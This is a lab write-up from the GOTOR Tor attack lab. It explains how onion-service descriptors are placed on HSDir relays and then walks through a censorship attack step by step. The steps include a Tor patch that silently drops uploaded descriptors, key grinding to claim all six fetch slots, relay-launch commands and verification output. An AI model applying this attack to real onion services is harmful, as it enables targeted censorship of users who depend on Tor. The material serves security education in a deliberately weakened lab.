---
title: "GOTOR - Censoring an Onion Service with an HSDir Preshot"
date: 2026-10-29 21:00:00 +0100
categories: [CTF, GOTOR]
tags: [tor, onion-service, hsdir, shared-random-value, censorship, writeup]
media_subpath: /assets/img/
---

## GOTOR

> This is a writeup for one of the attacks in **GOTOR**, a self-hosted lab for practising attacks against Tor. The lab is available [on GitHub](https://github.com/NiBi8z/GOTOR).
{: .prompt-tip }

For this challenge, the goal is to make a specific `.onion` unreachable. We are not going to deanonymize it this time - we are going to **censor** it, by making sure that every relay responsible for storing its descriptor is a relay **we** control, and that silently throws the descriptor away.

![The challenge setup](hsdirsetup.png)

First, notice the sentence in the challenge description:

> Relays get flags really fast: that's not a problem, is it?

That one line is the whole key to the attack, and we will come back to *why* at the end - because on the real Tor network this attack essentially cannot be pulled off, and that sentence is exactly what makes the lab different.

To pull this off we need two things:

1. A **fork of Tor** that accepts descriptor uploads but does not actually store them. From the outside the upload looks like it succeeded, but the descriptor simply does not exist on the relay anymore - so any client trying to fetch it comes back empty-handed.
2. An understanding of **how a relay is chosen to store a given onion's descriptor**, so that we can arrange to be exactly that relay for the onion we are targeting.

The second point is where all the fun is, so let's start there.

## How onion descriptors are located

When you publish a v3 onion service, you don't advertise your IP anywhere - you publish a **descriptor** (containing your introduction points) onto a handful of relays that carry the `HSDir` flag. A client that wants to reach you downloads that descriptor from the same relays. Those relays are the **Hidden Service Directories** (HSDirs).

The whole trick is that nobody gets to *choose* which HSDirs hold a given descriptor: the set is derived deterministically from the onion address, the current time, and a network-wide random value. Both the service (when uploading) and the client (when fetching) run the exact same computation and land on the exact same relays.

### The hash ring

All HSDir relays are placed on a ring, sorted by a per-relay value called the **`hsdir_index`**. For a given onion, Tor computes a second value, the **`hs_index`**, and the responsible HSDirs are simply the relays whose `hsdir_index` comes **right after** that `hs_index` on the ring (walking upward, wrapping around at the end).

The two indices are SHA3-256 digests (`src/feature/hs/hs_common.c`):

```
hs_index(replica) = SHA3-256(
      "store-at-idx"
    | blinded_public_key
    | INT_8(replica)
    | INT_8(period_length)
    | INT_8(period_num) )

hsdir_index(node) = SHA3-256(
      "node-idx"
    | node_ed25519_identity
    | shared_random_value (SRV)
    | INT_8(period_num)
    | INT_8(period_length) )
```

A few things worth noticing:

- The `hs_index` is built from the onion's **blinded public key**, not its long-term identity key. The blinded key is re-derived every time period, so the position of the onion on the ring changes every period - this is what prevents anyone from precomputing the whole ring far in advance.
- The `hsdir_index` of a relay is built from the relay's **identity key** and the **SRV**. The **SRV** is a random value rolled once a day in the real Tor network and published in the consensus. Since the SRV is a value an attacker cannot predict ahead of time, a relay cannot know in advance *which* onions it will end up responsible for... as long as the SRV stays unpredictable. (Keep that in mind - it is the crack we will pry open.)
- Both indices mix in `period_num` and `period_length`, so the ring is only valid for one time period.

### How many relays, and which ones

The lookup is governed by three consensus parameters (defaults from `hs_common.h`):

| Parameter | Default | Meaning |
|---|---|---|
| `hsdir_n_replicas` | `2` | the descriptor is stored under **two** different `hs_index` values |
| `hsdir_spread_store` | `4` | a service uploads to the **4** relays after each replica's index |
| `hsdir_spread_fetch` | `3` | a client fetches from the **3** relays after each replica's index |

So from a client's point of view, a descriptor lives on `2 replicas × 3 = 6` relays. **Those six fetch slots are exactly what we need to own.** The selection itself is a binary search for `hs_index` on the sorted ring, then a walk forward picking `spread` relays (`hs_get_responsible_hsdirs`):

```
sort all HSDir nodes by hsdir_index
for replica in 1..n_replicas:
    i = first node whose hsdir_index >= hs_index(replica)   # wrap if past the end
    take the next `spread` nodes going upward
```

The consequence is simple and brutal: if we can manufacture relays whose `hsdir_index` falls **just above** a target onion's `hs_index`, our relays become the responsible HSDirs for that onion.

And here is the crucial part for an attacker: **every single input to these two formulas is something we can obtain.** The onion address itself decodes to the identity key, from which we derive the `blinded_public_key` for the current period. The `period_num` and `period_length` come straight from the clock and the consensus. And the `SRV` is published in plain sight inside the consensus document, which anyone can download. In other words, nothing in the `hs_index`/`hsdir_index` computation is secret - we can reproduce Tor's HSDir selection exactly, and even replay it for any relay's identity key to see where it lands on the ring. The entire security of this scheme therefore rests on *when* we get to learn the SRV, not on whether we can do the math. Hold that thought.

## Time periods and the Shared Random Value

Two clocks drive the ring.

**The time period.** By default a time period lasts `1440` minutes (24 h), with a rotation offset of `720` minutes, i.e. it flips at **12:00 UTC**:

```
period_num = floor( (unix_time/60 - rotation_offset) / period_length )
```

**The Shared Random Value (SRV).** This is a 32-byte value that the directory authorities jointly generate through the shared-randomness protocol and publish in the consensus. It rotates once a day, at **00:00 UTC**, and the consensus carries both the `shared-rand-current-value` and the `shared-rand-previous-value`.

The two clocks are deliberately **12 hours out of phase** (SRV at 00:00, time period at 12:00). That offset creates an overlap window and a subtle rule about *which* SRV to use - and getting it right is the difference between a key that lands you on the ring and one that lands you nowhere.

> Everything above describes the **real** network: a 24-hour time period, a daily SRV, and a 12-hour offset between them. Our lab runs the same machinery on a stopwatch instead of a calendar: the time period is **24 minutes** and the SRV rotates every **24 minutes**, with the current/previous switch happening at the **12-minute** mark of each cycle. The *proportions* are identical to the real network (half a period), only the absolute durations are compressed. Keep this in mind for the rest of the post - whenever I say "day", the lab means "24 minutes".
{: .prompt-info }

### Current or previous SRV? (the part that bites)

Here is the diagram straight from Tor's `hs_in_period_between_tp_and_srv()`:

```
 00:00      12:00       00:00       12:00       00:00
 SRV#1      TP#1        SRV#2       TP#2        SRV#3
   $==========|-----------$===========|-----------$
              ^^^^^^^^^^^^            ^^^^^^^^^^^^
```

Clients **always fetch using the current time period**. What changes is the SRV (`node_set_hsdir_index` in `src/feature/nodelist/nodelist.c`):

- In the segment **00:00 → 12:00** (a new SRV has been published, but the time period has not flipped yet): fetches use the **previous** SRV.
- In the segment **12:00 → 00:00** (the time period has flipped, no new SRV yet - the `^^^^` region): fetches use the **current** SRV.

Why this seesaw? Because the hashring for a given time period must stay stable for the *whole* period, even though a fresh SRV appears halfway through it. Tor pins the period to the SRV that was in effect when the period began, so a descriptor uploaded at the start of the period can still be found at the end.


> One more detail: a *service* uploads twice (a "first" and a "second" descriptor) precisely to straddle this boundary - one upload under the previous SRV, one under the current. We only care about the **fetch** set, because that is the one clients read from. Own the fetch slots and the onion goes dark regardless of what the service uploaded.
{: .prompt-info }

## Why this normally cannot work

We just established that we can compute the whole ring. So why isn't this attack trivial on the real network? Because pulling it off requires **two conditions to be true at the same time**:

1. **Know the SRV** for the time period we are targeting - otherwise we cannot compute the `hsdir_index` our forged keys need to match.
2. **Actually hold the `HSDir` flag** during that time period - a relay without the flag is simply excluded from the ring, no matter how perfectly its index was forged.

On the real network these two conditions are mutually exclusive in practice, and that is entirely by design.

The SRV is only knowable **on the day it applies**. It is the output of a commit-and-reveal protocol run by the directory authorities, and it only appears, in finished form, in the consensus that covers the period it governs. You cannot learn next week's SRV today, so you cannot grind a useful key today.

Earning the `HSDir` flag, on the other hand, is **slow**. The directory authorities only grant it to a relay that has been continuously up for at least `MinUptimeHidServDirectoryV2`, whose default is **96 hours - four days** (`dirserv_thinks_router_is_hs_dir()` in `src/feature/dirauth/voteflags.c`, with the relay also needing the `Stable` and `Fast` flags).

Put the two together and the attack collapses: the SRV you would need is only revealed on the day of the attack, but a relay you spin up on that same day will not be a usable HSDir for another four days - by which point the SRV has rotated four times and your carefully forged keys point to a ring that no longer exists. You can know the SRV, or you can be an HSDir, but not both for the same period.

So how does the lab let us win? Look again at the hint: *"Relays get flags really fast: that's not a problem, is it?"*

## The attack

The plan, now that the mechanics are clear:

1. Fork Tor so our HSDir **accepts** descriptor uploads but **drops** them (a black hole).
2. For the target onion, compute its `hs_index` for each replica, using the time period and SRV that clients will use to fetch.
3. **Grind ed25519 identity keys** until we find ones whose `hsdir_index` lands just above those `hs_index` values - closer than any honest relay.
4. Boot our forged relays, wait for them to earn the `HSDir` flag, and watch them take over the six fetch slots.

### The Tor fork: a black-hole HSDir

In `tor/src/feature/hs/hs_cache.c`, the function `hs_cache_store_as_dir()` is what a relay calls to store a descriptor that was just uploaded to it. We short-circuit it: we return success so the uploading service believes everything is fine, but we never cache anything.

```c

/** Given an encoded descriptor, store it in the directory cache depending on
 * which version it is. Return a negative value on error. On success, 0 is
 * returned. */
int
hs_cache_store_as_dir(const char *desc)
{
  hs_cache_dir_descriptor_t *dir_desc = NULL;

  tor_assert(desc);
  /* GOTOR blackhole : we accept but we don't do anything . */
  log_notice(LD_REND, "GOTOR blackhole: dropping HS descriptor upload");
  return 0;

  /* Create a new cache object. This can fail if the descriptor plaintext data
   * is unparseable which in this case a log message will be triggered. */
  dir_desc = cache_dir_desc_new(desc);
  if (dir_desc == NULL) {
    goto err;
  }
```

We `return 0` (the success code) while having done nothing at all - and we log it in passing, so we can see uploads hitting the trap.

#### Building the fork and the node image

We compile our forked Tor inside a Docker image:

```dockerfile
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
      build-essential pkg-config \
      autoconf automake libtool git python3 \
      libevent-dev libssl-dev zlib1g-dev liblzma-dev libzstd-dev \
 && rm -rf /var/lib/apt/lists/*

WORKDIR /src
COPY . .

RUN git clean -xdf 2>/dev/null || true


RUN ./autogen.sh \
 && ./configure --disable-unittests --disable-asciidoc \
 && make -j"$(nproc)" src/app/tor
```

Then we build the image:

```bash
podman build -f Dockerfile -t tor-blackhole tor
...
Successfully tagged localhost/tor-blackhole:latest
3e8b37f1b4237e5ad66f858d5fc44e62cb242f187a9453e0d815bf0df44e75a5
```

Next, we build the node image that will act as our HSDir relay, grafting the forked Tor into it:

```dockerfile
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
      python3 python3-pip \
      curl netcat-openbsd iproute2 procps ca-certificates jq \
      libevent-2.1-7 libssl3 zlib1g liblzma5 libzstd1 \
 && rm -rf /var/lib/apt/lists/*

RUN pip3 install --break-system-packages --no-cache-dir stem requests pysocks

COPY --from=tor-blackhole /src/src/app/tor /usr/bin/tor

COPY scripts/ /scripts/
RUN chmod +x /scripts/*.sh

ENTRYPOINT ["/scripts/entrypoint.sh"]
```

Thanks to `COPY --from=tor-blackhole /src/src/app/tor /usr/bin/tor`, our forked Tor is baked into the relay image:

```bash
➜  GOTOR git:(main) ✗ podman build -f attack/HSDir_preshot/blackhole/Dockerfile -t goadtor/blackhole-hsdir:latest .
...
Successfully tagged localhost/goadtor/blackhole-hsdir:latest
b88c09d028867d842f71aca9c96737571f2b902de2a547e23d9715015b39e2ac

```

We now have a podman image running a black-hole HSDir. We will start our `blackhole-hsdir` relays with forged keys (see below), exactly like any other lab relay:

```bash
podman run -d --name bh1 --network gotor \
  -v gotor_shared:/shared -v "$PWD/torrc:/torrc:ro" \
  -e TOR_ROLE=relay -e TOR_NICK=bh1 \
  goadtor/blackhole-hsdir:latest
```

### Forging the keys


To forge the keys we need to be able to compute the blinded key for a given onion, along with a whole pile of other values defined in the Tor specification.

I'll plead guilty here: I fed the Tor spec to an LLM and asked it to write me a Python script that, for a given `.onion`, returns its `hs_index`. Then I asked it to add an option that - given a consensus (to recover the SRV) and the relay descriptors - grinds key pairs until it finds one whose `hsdir_index` lands extremely close to our onion's `hs_index`. Because relays get their flags almost instantly in this lab, we can then boot relays with those keys: they earn the `HSDir` flag and sit closer to the `hs_index` than any honest relay, which makes us the responsible directories for that descriptor - and lets us make the onion unreachable.

Long story short, the LLM produced the script `hsdir_preshot.py`.

`hsdir_preshot.py` has two modes:

- **`index`** parses an onion address, extracts everything needed (identity key, blinded key, period, SRV) and computes the `hs_index` values we need to match.
- **`attack`** takes those target values and **grinds ed25519 keys** whose `hsdir_index` falls very close to - and just above - the target, so the resulting relays become responsible for that onion and can drop its descriptor.

A few features worth calling out:

- `--close-bits` controls how many leading bits of the `hs_index` a forged key must match. More bits = closer on the ring = guaranteed slot, but exponentially more grinding. We also have a mode that simply keeps the best match found over a fixed number of attempts.
- `--target-replica` selects which replica (1 or 2) we are grinding for, so we can spread keys across both.
- It automates the whole search: by default it hunts for **3 HSDirs across 2 replicas → 6 relays** in total (matching `spread_fetch × n_replicas`).

We also feed it the **consensus** and the **descriptors** so it knows the current SRV, the current keys of the honest relays, and therefore when our forged keys actually beat them.

Grabbing the consensus and the descriptors:

```bash
podman exec auth1 curl -s http://10.44.0.11:9030/tor/status-vote/current/consensus > poc/cons
podman exec auth1 curl -s http://10.44.0.11:9030/tor/server/all > poc/desc
```

Then we forge our 6 keys:

```bash
➜  HSDir_preshot git:(main) ✗ for r in 1 2; do for i in a b c; do
  python3 hsdir_preshot.py attack $ONION --consensus poc/cons --descriptors poc/desc \
    --target-replica $r --close-bits 10 --out poc/keys/r${r}${i}
done; done

[i] SRV = shared-rand-previous-value from the consensus (calibrated).
onion address      : uz3rrl6kfyboguefq3m27qjtkv4vicqachyp2uywhwl32g7cbey3gsqd.onion
identity key       : a67718afca2e02e3508586d9afc1335579540a0011f0fd53163d97bd1be20931
valid-after        : 2026-10-27T11:24:00+00:00  (unix 1793100240)
period_num         : 1245208   period_length : 24 min
SRV                : a01eafd5836d4d86054656f4449d6e14f8ecab84629e6953937d8760ee96bfc9
blinded_public_key : b6693bb4efc824e1b687154c54cf9c2954e4d1f9692754190a2b33b315c9f1c2
target replica     : 1
hs_service_index   : 0a7999c5d156b4310bdda4bb57d3f7318c14cef5e209d4221c8ab65e9ace7263

competitors loaded : 14
current HSDir #1   : middle4  (distance = 4 leading bits above the index)

goal               : distance <= 113078212145816597093331040047546785012958969400039613319782796882727665663 (~10 leading bits)   jobs=12   max_tries=unlimited
searching ..

.......
  poc/keys/r2c/ed25519_master_id_secret_key
  poc/keys/r2c/ed25519_master_id_public_key

To inject into a lab relay:
  - copy these 2 files into  <DataDirectory>/keys/
    (lab relay role: /var/lib/tor-node/keys/)
  - remove any existing ed25519_signing_* and certificate
    so Tor regenerates them from the master key
  - restart the relay; check its ed25519 fingerprint:
      8e3e1f6836082c04ae9629f6df89185e97dc73c20b8b63f47a72985218509848
➜  HSDir_preshot git:(main) ✗
```

Notice the lab here runs an accelerated cycle: `period_length` is **24 minutes** instead of 24 hours, and the SRV rotates every 24 minutes too. That is why we settle for only **10 bits of proximity**: with so few relays on the ring, 10 bits is already enough to be the nearest node above the index, and it keeps the grind fast - which matters a lot when the whole hashring is reshuffled every 24 minutes.

The full `hsdir_preshot.py` tool is available [here](/scripts/hsdir_preshot.py).

### Launching the forged relays

We start the six relays and inject each forged master key. We remove the existing signing keys and certificate so Tor regenerates them from our forged master key, then restart:

```bash
n=0
for r in 1 2; do for i in a b c; do
  n=$((n+1)); name="bh$n"
  podman rm -f $name 2>/dev/null
  podman run -d --name $name --network gotor \
    -v gotor_shared:/shared -v "$PWD/torrc:/torrc:ro" \
    -e TOR_ROLE=relay -e TOR_NICK=$name goadtor/blackhole-hsdir:latest
  sleep 3
  podman cp attack/HSDir_preshot/poc/keys/r${r}${i}/ed25519_master_id_secret_key $name:/var/lib/tor-node/keys/
  podman cp attack/HSDir_preshot/poc/keys/r${r}${i}/ed25519_master_id_public_key $name:/var/lib/tor-node/keys/
  podman exec $name sh -c 'rm -f /var/lib/tor-node/keys/ed25519_signing_* /var/lib/tor-node/keys/secret_id_key'
  podman restart $name
done; done
```

Now we wait for the relays to earn the `HSDir` flag - until they have it, clients exclude them from the ring computation.

We grab the consensus and the descriptors again (this time with our new relays in them):


```bash
podman exec auth1 curl -s http://10.44.0.11:9030/tor/status-vote/current/consensus > poc/cons
podman exec auth1 curl -s http://10.44.0.11:9030/tor/server/all > poc/desc
```

After a couple of minutes, and after checking that the SRV has not rotated in the meantime, we verify who owns the ring for our target onion:

```bash
python3 hsdir_preshot.py ring $ONION --consensus poc/cons --descriptors poc/desc --spread 3
  replica 1  (hs_index 14d15587cd5f525b...) :
       19 bits  bh1          fp=C7A87C697E02CD05CF7ECE83F62194BF7ACF0B4C
       19 bits  bh2          fp=F32FDB10AD1B82B00D125B936BD7CCA103052300
       17 bits  bh3          fp=D2A924282DFFDC22AC1AAF10875EF04EB946E6D2
  replica 2  (hs_index e39149b20e5c3aa1...) :
       26 bits  bh4          fp=AD2ADC2F68E12DC61CA8AB137B23389B2F988A70
       16 bits  bh5          fp=C3D1D5C5CE8B8C7D7CD04038BE976672C7C8983A
       16 bits  bh6          fp=4A2164782A87753881C25A0E5662979F27E87DD8
```

Victory! All six fetch slots, across both replicas, are held by our black-hole relays. The onion's descriptor now has nowhere to live. Let's try to reach it:

```bash
➜  HSDir_preshot git:(main) ✗ curl --socks5-hostname 127.0.0.1:9050 \
    http://uz3rrl6kfyboguefq3m27qjtkv4vicqachyp2uywhwl32g7cbey3gsqd.onion
^C
```

No response from the `.onion`! The service is still running and still uploading its descriptor - but every relay it uploads to drops it on the floor, and every client that asks for it gets nothing. We have censored the onion without ever touching the server.


![](hsdir_preshot_solve.png)

## Conclusion

This attack is a **targeted denial of service** against a single onion, and it works because of one assumption: that a relay cannot know in advance which onions it will be responsible for. That assumption only holds while the SRV is unpredictable. The moment the SRV is known - which, in this lab, it always is, because it sits right there in the consensus and we can read it - the whole hashring becomes computable ahead of time, and "being the responsible HSDir" turns into a key-grinding exercise.

That is exactly why **the delay before Tor grants its flags is a security property, not a performance detail.**